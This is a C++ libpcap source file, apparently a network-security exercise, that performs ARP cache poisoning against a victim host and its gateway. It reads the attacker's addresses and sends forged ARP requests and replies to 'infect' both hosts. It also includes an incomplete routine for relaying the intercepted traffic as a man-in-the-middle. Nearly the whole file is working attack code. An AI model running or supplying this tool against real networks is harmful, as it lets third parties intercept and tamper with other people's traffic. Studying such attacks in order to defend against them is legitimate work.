#include <QCoreApplication>
#include <iostream>
#include <fstream>
#include <stdio.h>

// Add class made by bearics
#include "arppacket.h"

using namespace std;

static ArpPacket a2s;
static ArpPacket a2t;

void getAttackerInfo(u_char* ip, u_char* mac);
void sendPkt(pcap_t *handle, u_char* send_pkt, int size);
void setInfectedPkt(pcap_t *handle, struct pcap_pkthdr *header);
void receivePkt(pcap_t *handle, struct pcap_pkthdr *header);

int main(int argc, char *argv[])
{
    pcap_t *handle;			/* Session handle */
    char *dev;			/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    //struct bpf_program fp;		/* The compiled filter */
    //char filter_exp[] = "port ";	/* The filter expression */
    bpf_u_int32 mask;		/* Our netmask */
    bpf_u_int32 net;		/* Our IP */
    struct pcap_pkthdr *header;	/* The header that pcap gives us */

    // attacker's information
    u_char attackerIP[16];     // 255.255.255.255 = 15+1
    u_char attackerMAC[18];    // FF:FF:FF:FF:FF:FF = 17+1

    getAttackerInfo(attackerIP, attackerMAC);

    cout << "Attacker's IP : " << attackerIP <<endl;
    cout << "Attacker's MAC : " << attackerMAC<<endl;

    cout << "Setting packets " << endl;

    // eth0 senderIP targetIP

    // attacker send to sender
    a2s.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2s.setEtherSourceMac(attackerMAC);
    a2s.setArpOpcode(ARPOP_REQUEST);
    a2s.setArpSenderIP((u_char*)argv[3]);
    a2s.setArpSenderMac(attackerMAC);
    a2s.setArpTargetIP((u_char*)argv[2]);
    a2s.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    // attacker send to target
    a2t.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2t.setEtherSourceMac(attackerMAC);
    a2t.setArpOpcode(ARPOP_REQUEST);
    a2t.setArpSenderIP((u_char*)argv[2]);
    a2t.setArpSenderMac(attackerMAC);
    a2t.setArpTargetIP((u_char*)argv[3]);
    a2t.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    /* Define the device */
    dev = pcap_lookupdev(errbuf);;
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    printf("Device is %s\n", argv[1]);
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        return(2);
    }


    //thread t(&receivePkt, handle, header);
    //t.join();

    sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
    sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
    thread t(&setInfectedPkt, handle, header);
    t.join();

}

void getAttackerInfo(u_char* attackerIP, u_char* attackerMAC)
{
    FILE *fp;

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 1p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerIP);
    pclose(fp);

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 3p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerMAC);
    pclose(fp);

}

void sendPkt(pcap_t *handle, u_char* send_pkt, int size)
{
    if(pcap_sendpacket(handle, send_pkt, size) == -1)
        cout << "Sending ERROR!" << endl;
    else
        cout << "Sending SUCCESS!" << endl;
}

void setInfectedPkt(pcap_t *handle, struct pcap_pkthdr *header)
{
    int res=0;
    int checkSenderPkt=0;
    int checkTargetPkt=0;
    const u_char *pkt;
    struct ether_header *eth;
    struct ether_arp *arp;
    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0 && (checkSenderPkt < 1 || checkTargetPkt < 1 )){
        eth=(struct ether_header *)pkt;
        arp=(struct ether_arp *)(pkt+ETH_HLEN);
        if(memcmp(arp->arp_spa, a2s.arp->arp_tpa, sizeof(in_addr)) ==0 )
        {
            printf("a2s.eth->ether_dhost : "); for(int i=0; i<6;i++) printf("%02x ", a2s.eth->ether_dhost[i]);printf("\n");
            printf("arp-> arp_sha : "); for(int i=0; i<6;i++) printf("%02x ", arp->arp_sha[i]);printf("\n");
            printf("size : %d\n", ETH_ALEN);
            memcpy(a2s.eth->ether_dhost, arp->arp_sha, ETH_ALEN);
            memcpy(a2s.arp->arp_tha, arp->arp_sha, ETH_ALEN);
            a2s.setArpOpcode(ARPOP_REPLY);
            checkSenderPkt++;
            sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
            a2s.printPkt();
            cout << "sned to infect sender" << endl;
        }
        else if(memcmp(arp->arp_spa, a2t.arp->arp_tpa, sizeof(in_addr)) ==0 )
        {
            printf("a2t.eth->ether_dhost : "); for(int i=0; i<6;i++) printf("%02x ", a2t.eth->ether_dhost[i]);printf("\n");
            printf("arp-> arp_sha : "); for(int i=0; i<6;i++) printf("%02x ", arp->arp_sha[i]);printf("\n");
            printf("size : %d\n", ETH_ALEN);
            memcpy(a2t.eth->ether_dhost, arp->arp_sha, ETH_ALEN);
            memcpy(a2t.arp->arp_tha, arp->arp_sha, ETH_ALEN);
            a2t.setArpOpcode(ARPOP_REPLY);
            checkTargetPkt++;
            sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
            a2t.printPkt();
            cout << "sned to infect target" << endl;
        }
    }
    cout << "fin infect" << endl;
}

void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
{
    int res=0;
    const u_char *pkt;
    struct ether_header *eth;
    struct ether_arp *arp;
    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
        eth=(struct ether_header *)pkt;
        arp=(struct ether_arp *)(pkt+ETH_HLEN);

        cout << "checking" << endl;
        if(ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            if(memcmp(a2s.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETH_ALEN) == 0) {
                cout << "need to infect\n";
                sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
                sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
                cout << "Send infect packet" << endl;
                continue;
            }
        }
        if(memcmp(a2s.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0){
            memcpy(eth->ether_dhost, a2t.arp->arp_tha, ETH_ALEN);
            memcpy(eth->ether_shost, a2t.arp->arp_sha, ETH_ALEN);
            cout << "victim's pkt relay to gatyway" << endl;
            // sender(victim)'s pkt relay to target(gateway)
        } // check targetIP == received packet's sourceIP(=targetIP)
        else if(memcmp(a2t.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {
            memcpy(eth->ether_dhost, a2s.arp->arp_tha, ETH_ALEN);
            memcpy(eth->ether_shost, a2s.arp->arp_sha, ETH_ALEN);
            cout << "gateway's pkt relay to victim" << endl;
            // sender(gateway)'s pkt relay to target(victim)
        }

    }
}
